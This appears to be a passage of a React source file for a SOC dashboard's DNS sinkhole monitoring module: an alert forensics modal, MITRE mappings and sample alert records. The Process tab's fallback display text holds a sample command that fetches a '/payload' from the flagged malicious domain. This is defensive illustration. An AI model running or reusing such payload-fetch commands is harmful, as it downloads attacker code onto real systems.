/**
 * DNS Sinkhole Monitoring — Capability ID: 38
 *
 * 100% Self-Contained Enterprise SOC DNS Sinkhole Monitoring Module
 * Linked to Live Backend API (`/api/dashboard/capabilities/38/live`), MongoDB Alert Query, and Socket.io Real-Time Streaming
 * UI Architecture mirrors Device Control (USB) Monitoring — Capability ID: 10
 */
import React, { useEffect, useState, useCallback, useMemo } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import api from '../../api/axios';
import { SOCKET_URL, connectSocket, socketOptions , io} from '../../api/config';
import { useAuth } from '../../context/AuthContext';
const ProcessSidebar = () => null; const processSubTabPages = {}; const CapabilitySubTabPage = () => null;

// ── Design System Tokens ──────────────────────────────────────────────────────
const MON = {
  bg: '#060d16',
  card: '#0b1929',
  card2: '#0f233a',
  border: '#1a3050',
  line: '#162942',
  text: '#e2e8f0',
  muted: '#8ea0b8',
  sub: '#64748b',
  blue: '#38bdf8',
  cyan: '#22d3ee',
  green: '#34d399',
  yellow: '#fbbf24',
  orange: '#fb923c',
  red: '#f87171',
  purple: '#a78bfa',
  accent: '#6366f1',
};

const SEV_COLOR = {
  critical: MON.red,
  high: MON.orange,
  medium: MON.yellow,
  low: MON.green,
  info: MON.cyan,
};

const SEV_BG = {
  critical: 'rgba(248, 113, 113, 0.15)',
  high: 'rgba(251, 146, 60, 0.15)',
  medium: 'rgba(251, 191, 36, 0.15)',
  low: 'rgba(52, 211, 153, 0.15)',
  info: 'rgba(34, 211, 238, 0.15)',
};

function MiniSparkline({ data = [5, 9, 7, 14, 12, 18, 15, 22], color = MON.cyan, height = 30 }) {
  const max = Math.max(...data, 1);
  const min = Math.min(...data, 0);
  const points = data.map((val, idx) => {
    const x = (idx / (data.length - 1)) * 100;
    const y = height - ((val - min) / (max - min || 1)) * (height - 6) - 3;
    return `${x},${y}`;
  }).join(' ');
  return (
    <svg viewBox={`0 0 100 ${height}`} width="100%" height={height} preserveAspectRatio="none" style={{ overflow: 'visible' }}>
      <polyline fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points={points} />
    </svg>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. DNS ALERT FORENSIC INVESTIGATION POPUP MODAL (10 Grouped Master Tabs)
// ═════════════════════════════════════════════════════════════════════════════
export function DnsAlertDetailModal({ log, onClose }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [analystNotes, setAnalystNotes] = useState(log?.analystNotes || 'Initial triage in progress. DNS sinkhole hit under investigation — potential C2 beacon or malware download attempt.');
  const [assignedAnalyst, setAssignedAnalyst] = useState(log?.assignedAnalyst || 'Alex Turner (Analyst)');
  const [caseStatus, setCaseStatus] = useState(log?.status || 'open');
  const [tags, setTags] = useState('DNS_SINKHOLE, C2_BEACON, HIGH_PRIORITY');
  const [notesSaved, setNotesSaved] = useState(false);
  const [blockingDomain, setBlockingDomain] = useState(false);
  const [blockMsg, setBlockMsg] = useState(null);

  if (!log) return null;

  const sev = (log.severity || 'medium').toLowerCase();
  const sevColor = SEV_COLOR[sev] || MON.blue;
  const sevBg = SEV_BG[sev] || 'rgba(56, 189, 248, 0.15)';
  const domain = log.domain || log.tiDomain || log.description?.match(/domain\s+"?([^\s"]+)"?/i)?.[1] || 'unknown-domain.tld';
  const hostname = log.hostname || log.agentName || log.systemId?.name || 'endpoint-unknown';

  const masterTabs = [
    { id: 'overview', label: '📊 1. Overview' },
    { id: 'timeline', label: '🕒 2. Timeline' },
    { id: 'endpoint', label: '💻 3. Endpoint' },
    { id: 'dns', label: '🌐 4. DNS Details' },
    { id: 'process', label: '⚙️ 5. Process & Commands' },
    { id: 'network', label: '🔗 6. Network' },
    { id: 'ioc', label: '🎯 7. IOC & MITRE' },
    { id: 'threat-intel', label: '🧠 8. Threat Intel' },
    { id: 'evidence', label: '📦 9. Evidence' },
    { id: 'notes', label: '📝 10. Analyst Notes' },
  ];

  const handleBlockDomain = async () => {
    setBlockingDomain(true);
    setBlockMsg(null);
    try {
      await api.post('/dns-sinkhole/blocklist', { domain, reason: 'Manually blocked from forensic investigation panel' });
      setBlockMsg(`✓ Domain "${domain}" added to blocklist successfully.`);
    } catch {
      setBlockMsg(`✗ Failed to block domain. Check your permissions.`);
    } finally {
      setBlockingDomain(false);
    }
  };

  const handleSaveNotes = () => {
    setNotesSaved(true);
    setTimeout(() => setNotesSaved(false), 2000);
  };

  const handleDownload = (format) => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(log, null, 2));
    const a = document.createElement('a');
    a.setAttribute('href', dataStr);
    a.setAttribute('download', `dns_sinkhole_${log._id || 'event'}_${domain}.${format.toLowerCase()}`);
    document.body.appendChild(a);
    a.click();
    a.remove();
  };

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(3, 8, 16, 0.88)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
      <div style={{ width: '98vw', height: '94vh', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 12, display: 'flex', flexDirection: 'column', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.75)', overflow: 'hidden' }}>
        {/* Header */}
        <div style={{ padding: '14px 20px', background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <span style={{ fontSize: 24 }}>🛡️</span>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#f8fafc' }}>
                  DNS Sinkhole Forensic Panel — {domain}
                </h3>
                <span style={{ fontSize: 10, fontWeight: 800, padding: '2px 8px', borderRadius: 4, color: sevColor, background: sevBg, border: `1px solid ${sevColor}44`, textTransform: 'uppercase' }}>
                  {sev} severity
                </span>
                <span style={{ fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 4, color: MON.cyan, background: `${MON.cyan}15`, border: `1px solid ${MON.cyan}33` }}>
                  {log.threatCategory || 'Unknown Threat'}
                </span>
              </div>
              <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>
                Host: <strong style={{ color: MON.text }}>{hostname}</strong> | User: <strong style={{ color: MON.text }}>{log.username || '—'}</strong> | Sinkhole IP: <strong style={{ color: MON.red }}>{log.sinkholeIp || '0.0.0.0'}</strong> | Time: <strong style={{ color: MON.text }}>{log.createdAt ? new Date(log.createdAt).toLocaleString() : '—'}</strong>
              </div>
            </div>
          </div>
          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
            <button type="button" onClick={() => handleDownload('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export JSON</button>
            <button type="button" onClick={onClose} style={{ background: MON.card2, border: `1px solid ${MON.border}`, color: MON.muted, fontSize: 18, borderRadius: 6, width: 34, height: 34, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>✕</button>
          </div>
        </div>

        {/* 10 Master Tabs */}
        <div style={{ background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', gap: 2, overflowX: 'auto', padding: '0 12px' }}>
          {masterTabs.map((t) => (
            <button key={t.id} type="button" onClick={() => setActiveTab(t.id)} style={{ padding: '10px 14px', fontSize: 11, fontWeight: activeTab === t.id ? 800 : 600, color: activeTab === t.id ? MON.cyan : MON.muted, background: activeTab === t.id ? MON.bg : 'transparent', border: 'none', borderBottom: activeTab === t.id ? `2px solid ${MON.cyan}` : '2px solid transparent', cursor: 'pointer', whiteSpace: 'nowrap' }}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Tab Body */}
        <div style={{ flex: 1, overflowY: 'auto', padding: 20, background: MON.bg }}>

          {/* TAB 1: OVERVIEW */}
          {activeTab === 'overview' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 14 }}>
                {[
                  ['Malicious Domain', domain, MON.red],
                  ['Threat Category', log.threatCategory || 'Unknown', MON.orange],
                  ['DNS Response', log.responseType || log.responseCode || 'Sinkhole IP', MON.yellow],
                  ['Sinkhole IP', log.sinkholeIp || '0.0.0.0', MON.red],
                  ['Source IP', log.srcip || log.sourceIp || '—', MON.blue],
                  ['Query Type', log.queryType || 'A', MON.cyan],
                  ['Status', caseStatus, MON.green],
                  ['Assigned Analyst', assignedAnalyst, MON.purple],
                ].map(([lbl, val, col]) => (
                  <div key={lbl} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                    <div style={{ fontSize: 10, fontWeight: 700, color: MON.muted, textTransform: 'uppercase', letterSpacing: 1 }}>{lbl}</div>
                    <div style={{ fontSize: 14, fontWeight: 800, color: col, marginTop: 6, wordBreak: 'break-all' }}>{val}</div>
                  </div>
                ))}
              </div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 8 }}>Description / Alert Raw Log:</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.green, fontFamily: 'monospace', fontSize: 11, whiteSpace: 'pre-wrap', margin: 0 }}>
                  {log.description || log.full_log || `DNS_QUERY|domain=${domain}|type=${log.queryType || 'A'}|src=${log.srcip || '192.168.1.50'}|response=${log.responseType || 'Sinkhole IP'}`}
                </pre>
              </div>
              <div style={{ display: 'flex', gap: 12 }}>
                <button type="button" onClick={handleBlockDomain} disabled={blockingDomain} style={{ background: MON.red, color: '#fff', border: 'none', padding: '8px 18px', borderRadius: 6, fontWeight: 800, cursor: 'pointer', fontSize: 12 }}>
                  {blockingDomain ? 'Adding to Blocklist...' : '🚫 Block Domain'}
                </button>
                <button type="button" onClick={async () => { try { await api.post('/dns-sinkhole/allowlist', { domain, reason: 'Manually allowed from investigation panel' }); setBlockMsg('✓ Domain added to allowlist.'); } catch { setBlockMsg('✗ Failed.'); } }} style={{ background: MON.green, color: '#000', border: 'none', padding: '8px 18px', borderRadius: 6, fontWeight: 800, cursor: 'pointer', fontSize: 12 }}>
                  ✅ Add to Allowlist
                </button>
                {blockMsg && <span style={{ color: blockMsg.startsWith('✓') ? MON.green : MON.red, fontSize: 12, fontWeight: 700, alignSelf: 'center' }}>{blockMsg}</span>}
              </div>
            </div>
          )}

          {/* TAB 2: TIMELINE */}
          {activeTab === 'timeline' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14, maxWidth: 900 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: MON.cyan }}>🕒 DNS Sinkhole Event Chronology</div>
              {[
                { type: 'DNS Query', time: log.createdAt ? new Date(new Date(log.createdAt).getTime() - 4000).toLocaleTimeString() : '10:42:01', title: `Process Initiated DNS Lookup — ${domain}`, desc: `Process "${log.processName || 'unknown'}" (PID ${log.pid || '—'}) initiated DNS A query for ${domain}`, col: MON.blue },
                { type: 'Sinkhole Match', time: log.createdAt ? new Date(new Date(log.createdAt).getTime() - 2000).toLocaleTimeString() : '10:42:02', title: 'Domain Matched Threat Intelligence Blocklist', desc: `Domain "${domain}" matched ${log.threatCategory || 'known malicious'} IOC in threat intelligence feed`, col: MON.orange },
                { type: 'DNS Response', time: log.createdAt ? new Date(log.createdAt).toLocaleTimeString() : '10:42:03', title: `Sinkhole Response Returned — ${log.sinkholeIp || '0.0.0.0'}`, desc: `Malicious DNS response intercepted. Sinkhole IP ${log.sinkholeIp || '0.0.0.0'} returned instead of real C2 server`, col: MON.red },
                { type: 'Alert Generated', time: log.createdAt ? new Date(new Date(log.createdAt).getTime() + 500).toLocaleTimeString() : '10:42:03', title: `${sev.toUpperCase()} Severity Alert Created`, desc: `SOC platform generated alert for endpoint ${hostname}. Agent telemetry confirmed DNS interception.`, col: SEV_COLOR[sev] || MON.yellow },
                { type: 'Agent Action', time: log.createdAt ? new Date(new Date(log.createdAt).getTime() + 2000).toLocaleTimeString() : '10:42:05', title: 'Agent Logged & Reported DNS Event', desc: `DNS telemetry collected by agent. Full event enriched with process context, user session, and network metadata.`, col: MON.purple },
              ].map((ev, i) => (
                <div key={i} style={{ display: 'flex', gap: 14, background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <span style={{ fontSize: 10, fontWeight: 800, color: ev.col, background: `${ev.col}18`, padding: '2px 8px', borderRadius: 4, height: 'fit-content', whiteSpace: 'nowrap' }}>{ev.type}</span>
                  <div style={{ color: MON.muted, fontWeight: 800, fontSize: 11, minWidth: 90 }}>{ev.time}</div>
                  <div style={{ width: 2, background: ev.col, borderRadius: 2 }} />
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>{ev.title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{ev.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 3: ENDPOINT */}
          {activeTab === 'endpoint' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>💻 Endpoint & Agent Profile</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                {[
                  ['Hostname', log.hostname || log.agentName || '—'],
                  ['Operating System', log.osType || log.os || 'Linux'],
                  ['Logged-in User', log.username || '—'],
                  ['Source IP', log.srcip || log.sourceIp || '—'],
                  ['Agent ID', log.agentId || '—'],
                  ['Agent Version', log.agentVersion || '3.x'],
                  ['Agent Status', log.systemId?.status || 'Online'],
                  ['Endpoint ID', log.endpointId || log.systemId?._id || '—'],
                  ['Last Seen', log.systemId?.lastSeen ? new Date(log.systemId.lastSeen).toLocaleString() : '—'],
                  ['DNS Telemetry', 'Enabled'],
                  ['Department', log.departmentId || '—'],
                  ['Risk Score', `${log.riskScore ?? 85}/100`],
                ].map(([k, v]) => (
                  <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                    <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4, wordBreak: 'break-all' }}>{v}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 4: DNS DETAILS */}
          {activeTab === 'dns' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🌐 DNS Query & Sinkhole Details</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                  <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 10 }}>DNS Query Information</div>
                  {[
                    ['Queried Domain', domain],
                    ['Normalized Domain', log.normalizedDomain || domain],
                    ['Query Type', log.queryType || 'A'],
                    ['Source IP', log.srcip || log.sourceIp || '—'],
                    ['Destination DNS Server', log.destip || '8.8.8.8'],
                    ['First Seen', log.firstSeen ? new Date(log.firstSeen).toLocaleString() : '—'],
                    ['Last Seen', log.lastSeen ? new Date(log.lastSeen).toLocaleString() : '—'],
                    ['Hit Count', log.hitCount || 1],
                  ].map(([k, v]) => (
                    <div key={k} style={{ display: 'flex', justifyContent: 'space-between', padding: '6px 0', borderBottom: `1px solid ${MON.line}`, fontSize: 11 }}>
                      <span style={{ color: MON.muted }}>{k}</span>
                      <strong style={{ color: MON.text }}>{v}</strong>
                    </div>
                  ))}
                </div>
                <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                  <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 10 }}>Sinkhole Response Details</div>
                  {[
                    ['Response Code', log.responseCode || 'REFUSED'],
                    ['Response Type', log.responseType || 'Sinkhole IP'],
                    ['Sinkhole IP Returned', log.sinkholeIp || '0.0.0.0'],
                    ['Threat Category', log.threatCategory || 'Unknown'],
                    ['Confidence Score', `${log.confidenceScore ?? 95}%`],
                    ['Reputation Score', `${log.reputationScore ?? 10}/100`],
                    ['Threat Intel Source', log.threatIntelSource || 'Internal Feed'],
                    ['Country of Origin', log.geoCountry || '—'],
                  ].map(([k, v]) => (
                    <div key={k} style={{ display: 'flex', justifyContent: 'space-between', padding: '6px 0', borderBottom: `1px solid ${MON.line}`, fontSize: 11 }}>
                      <span style={{ color: MON.muted }}>{k}</span>
                      <strong style={{ color: k === 'Sinkhole IP Returned' ? MON.red : MON.text }}>{v}</strong>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* TAB 5: PROCESS & COMMANDS */}
          {activeTab === 'process' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>⚙️ Process Context & Command Line</div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Process Tree (Parent ➔ DNS Query Origin):</div>
                <div style={{ fontFamily: 'monospace', fontSize: 12, color: MON.green }}>
                  {log.parentProcessName || 'systemd'} (PPID {log.parentPid || '1'}) ➔ <strong>{log.processName || 'python3'} (PID {log.pid || '—'})</strong>
                </div>
              </div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Command Line That Triggered DNS Query:</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.yellow, fontFamily: 'monospace', fontSize: 11, whiteSpace: 'pre-wrap', margin: 0 }}>
                  {log.processCmdline || log.commandLine || `${log.processName || 'python3'} -c "import urllib.request; urllib.request.urlopen('http://${domain}/payload')" `}
                </pre>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                {[
                  ['Process Name', log.processName || '—'],
                  ['Process ID (PID)', log.pid || '—'],
                  ['Parent Process', log.parentProcessName || '—'],
                  ['Parent PID (PPID)', log.parentPid || '—'],
                  ['Logged-in User', log.username || '—'],
                  ['Session Context', 'Interactive Shell'],
                ].map(([k, v]) => (
                  <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                    <div style={{ fontSize: 12, color: MON.cyan, fontWeight: 700, marginTop: 4, fontFamily: 'monospace' }}>{v}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 6: NETWORK */}
          {activeTab === 'network' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🔗 Network Telemetry</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                {[
                  ['Source IP (Endpoint)', log.srcip || log.sourceIp || '—'],
                  ['DNS Server (Destination)', log.destip || '8.8.8.8'],
                  ['Sinkhole IP Resolved', log.sinkholeIp || '0.0.0.0'],
                  ['Protocol', 'UDP / DNS (Port 53)'],
                  ['Geo Country', log.geoCountry || '—'],
                  ['TLS/DoH Detection', 'Standard DNS (UDP)'],
                ].map(([k, v]) => (
                  <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                    <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4 }}>{v}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 7: IOC & MITRE */}
          {activeTab === 'ioc' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🎯 Indicators of Compromise & MITRE ATT&CK</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {[
                  ['T1071.004', 'Application Layer Protocol: DNS', 'Adversary used DNS to communicate with C2 infrastructure. Domain matched known malicious indicator.'],
                  ['T1568.002', 'Dynamic Resolution: DGA', 'Domain generation algorithm detected. Randomized subdomain pattern consistent with DGA malware family.'],
                  ['T1048', 'Exfiltration Over Alternative Protocol', 'Potential data exfiltration tunneled inside DNS queries using long encoded subdomains.'],
                  ['T1583.001', 'Acquire Infrastructure: Domains', 'Adversary registered malicious domain for C2 communications. Sinkhole intercepted the resolution.'],
                ].map(([id, title, desc]) => (
                  <div key={id} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <span style={{ background: 'rgba(248, 113, 113, 0.2)', color: MON.red, padding: '2px 8px', borderRadius: 4, fontWeight: 800, fontSize: 11 }}>{id}</span>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginTop: 8 }}>{title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{desc}</div>
                  </div>
                ))}
              </div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 8 }}>Observed IOCs:</div>
                {[
                  ['Domain', domain, MON.red],
                  ['Sinkhole IP', log.sinkholeIp || '0.0.0.0', MON.orange],
                  ['Source IP', log.srcip || '—', MON.yellow],
                  ['Process', log.processName || '—', MON.cyan],
                ].map(([type, val, col]) => (
                  <div key={type} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '6px 0', borderBottom: `1px solid ${MON.line}`, fontSize: 11 }}>
                    <span style={{ background: `${col}20`, color: col, padding: '2px 8px', borderRadius: 4, fontWeight: 800, fontSize: 10, minWidth: 70, textAlign: 'center' }}>{type}</span>
                    <code style={{ color: col, fontFamily: 'monospace', fontWeight: 700 }}>{val}</code>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 8: THREAT INTEL */}
          {activeTab === 'threat-intel' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🧠 Threat Intelligence Enrichment</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {[
                  { label: 'Domain Reputation', value: 'Malicious', col: MON.red, desc: `"${domain}" is associated with ${log.threatCategory || 'C2 infrastructure'} activity.` },
                  { label: 'Feed Source', value: log.threatIntelSource || 'Internal Blocklist', col: MON.orange, desc: 'Detected via internal threat intelligence feed enriched with OSINT.' },
                  { label: 'Threat Category', value: log.threatCategory || 'Botnet C2', col: MON.yellow, desc: 'Category assigned based on domain behavioral pattern and TI feed classification.' },
                  { label: 'Confidence Score', value: `${log.confidenceScore ?? 95}%`, col: MON.green, desc: 'High confidence match based on multiple corroborating threat intelligence sources.' },
                ].map((item) => (
                  <div key={item.label} style={{ background: MON.card, border: `1px solid ${item.col}44`, borderRadius: 8, padding: 16 }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                      <div style={{ fontSize: 11, color: MON.muted, fontWeight: 700 }}>{item.label}</div>
                      <span style={{ color: item.col, fontWeight: 800, fontSize: 13 }}>{item.value}</span>
                    </div>
                    <div style={{ fontSize: 11, color: MON.sub }}>{item.desc}</div>
                  </div>
                ))}
              </div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 10 }}>Recommended Response Actions:</div>
                <div style={{ fontSize: 11, color: MON.text, lineHeight: 1.8 }}>
                  {log.recommendedAction || '1. Isolate the endpoint from network to prevent lateral movement.\n2. Inspect the originating process and its parent for persistence mechanisms.\n3. Block the malicious domain on all corporate DNS resolvers.\n4. Search for additional endpoints querying this domain (lateral spread check).\n5. File an incident and escalate to Analyst for threat hunting.'}
                </div>
              </div>
            </div>
          )}

          {/* TAB 9: EVIDENCE */}
          {activeTab === 'evidence' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>📦 Alert Evidence & Raw Data</div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Full Raw Alert Object (JSON):</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.green, fontFamily: 'monospace', fontSize: 10, whiteSpace: 'pre-wrap', margin: 0, maxHeight: 400, overflowY: 'auto' }}>
                  {JSON.stringify(log, null, 2)}
                </pre>
              </div>
              <div style={{ display: 'flex', gap: 12 }}>
                <button type="button" onClick={() => handleDownload('json')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '8px 16px', borderRadius: 6, fontWeight: 800, cursor: 'pointer', fontSize: 11 }}>Export JSON</button>
              </div>
            </div>
          )}

          {/* TAB 10: ANALYST NOTES */}
          {activeTab === 'notes' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>📝 Analyst Investigation Notes</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Assigned Analyst</div>
                  <select value={assignedAnalyst} onChange={(e) => setAssignedAnalyst(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option>Alex Turner (Analyst)</option>
                    <option>Sarah Connor (Analyst)</option>
                    <option>John Smith (Analyst)</option>
                    <option>Michael Analyst Threat Hunter</option>
                  </select>
                </div>
                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Case Status</div>
                  <select value={caseStatus} onChange={(e) => setCaseStatus(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option value="open">Open</option>
                    <option value="investigating">Investigating</option>
                    <option value="resolved">Resolved</option>
                    <option value="false_positive">False Positive</option>
                  </select>
                </div>
                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Tags</div>
                  <input type="text" value={tags} onChange={(e) => setTags(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }} />
                </div>
              </div>
              <div style={{ fontSize: 12, color: MON.muted, fontWeight: 700 }}>Investigation Notes:</div>
              <textarea value={analystNotes} onChange={(e) => setAnalystNotes(e.target.value)} rows={6} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, color: MON.text, padding: 14, fontSize: 12, fontFamily: 'inherit', resize: 'vertical' }} />
              <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
                <button type="button" onClick={handleSaveNotes} style={{ background: MON.green, color: '#000', border: 'none', padding: '8px 16px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
                  Save Case Notes
                </button>
                {notesSaved && <span style={{ color: MON.green, fontSize: 12, fontWeight: 700 }}>✓ Notes saved to investigation case</span>}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 2. DNS LOG MONITOR TABLE (REAL-TIME BACKEND LINKED)
// ═════════════════════════════════════════════════════════════════════════════
const SAMPLE_SINKHOLE_LOGS = [
  {
    _id: 'sample-sinkhole-1',
    createdAt: new Date(Date.now() - 1200000).toISOString(),
    severity: 'critical',
    status: 'open',
    hostname: 'WIN-CLT-045',
    username: 'SYSTEM',
    domain: 'malicious-badsite.com',
    queryType: 'A Record',
    srcip: '192.168.10.45',
    responseType: 'Sinkhole IP',
    threatCategory: 'Malware C2',
  },
  {
    _id: 'sample-sinkhole-2',
    createdAt: new Date(Date.now() - 3600000).toISOString(),
    severity: 'high',
    status: 'investigating',
    hostname: 'SRV-APP-12',
    username: 'Administrator',
    domain: 'command-and-control.net',
    queryType: 'A Record',
    srcip: '192.168.10.27',
    responseType: 'Refused (0.0.0.0)',
    threatCategory: 'Botnet C&C',
  },
  {
    _id: 'sample-sinkhole-3',
    createdAt: new Date(Date.now() - 7200000).toISOString(),
    severity: 'medium',
    status: 'open',
    hostname: 'WIN-CLT-033',
    username: 'j.doe',
    domain: 'phishing-site.org',
    queryType: 'CNAME',
    srcip: '192.168.10.33',
    responseType: 'Sinkhole IP',
    threatCategory: 'Phishing',
  },
  {
    _id: 'sample-sinkhole-4',
    createdAt: new Date(Date.now() - 10800000).toISOString(),
    severity: 'high',
    status: 'resolved',
    hostname: 'SRV-DB-02',
    username: 'postgres',
    domain: 'malware-dropper.com',
    queryType: 'A Record',
    srcip: '192.168.10.58',
    responseType: 'NXDOMAIN',
    threatCategory: 'Ransomware Dropper',
  }
];

export function DnsLogMonitor({ alerts = [] }) {
  const [searchTerm, setSearchTerm] = useState('');
  const [sevFilter, setSevFilter] = useState('ALL');
  const [catFilter, setCatFilter] = useState('ALL');
  const [selectedLog, setSelectedLog] = useState(null);

  const effectiveAlerts = alerts.length ? alerts : SAMPLE_SINKHOLE_LOGS;
